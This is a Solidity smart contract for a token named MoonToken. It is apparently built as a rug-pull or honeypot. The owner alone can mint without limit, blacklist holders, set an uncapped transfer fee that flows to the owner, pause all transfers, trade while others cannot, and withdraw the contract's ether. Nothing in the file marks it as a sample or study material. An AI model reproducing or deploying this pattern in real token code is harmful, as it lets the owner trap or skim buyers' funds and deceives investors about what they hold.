// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract MoonToken {
    address public owner; uint256 public totalSupply; uint256 public sellFee = 2; bool public tradingEnabled; bool public paused;
    mapping(address => uint256) public balanceOf; mapping(address => bool) public isBlacklisted;
    modifier onlyOwner() { require(msg.sender == owner, "no"); _; }
    constructor() { owner = msg.sender; totalSupply = 1e27; balanceOf[msg.sender] = 1e27; }
    function mint(address to, uint256 a) external onlyOwner { totalSupply += a; balanceOf[to] += a; }
    function setBlacklist(address a, bool b) external onlyOwner { isBlacklisted[a] = b; }
    function setSellFee(uint256 f) external onlyOwner { sellFee = f; }
    function pause(bool p) external onlyOwner { paused = p; }
    function enableTrading() external onlyOwner { tradingEnabled = true; }
    function withdrawAll() external onlyOwner { payable(owner).transfer(address(this).balance); }
    function transfer(address to, uint256 a) external returns (bool) {
        require(!paused && !isBlacklisted[msg.sender]);
        require(tradingEnabled || msg.sender == owner);
        uint256 fee = a * sellFee / 100;
        balanceOf[msg.sender] -= a; balanceOf[to] += a - fee; balanceOf[owner] += fee; return true;
    }
}
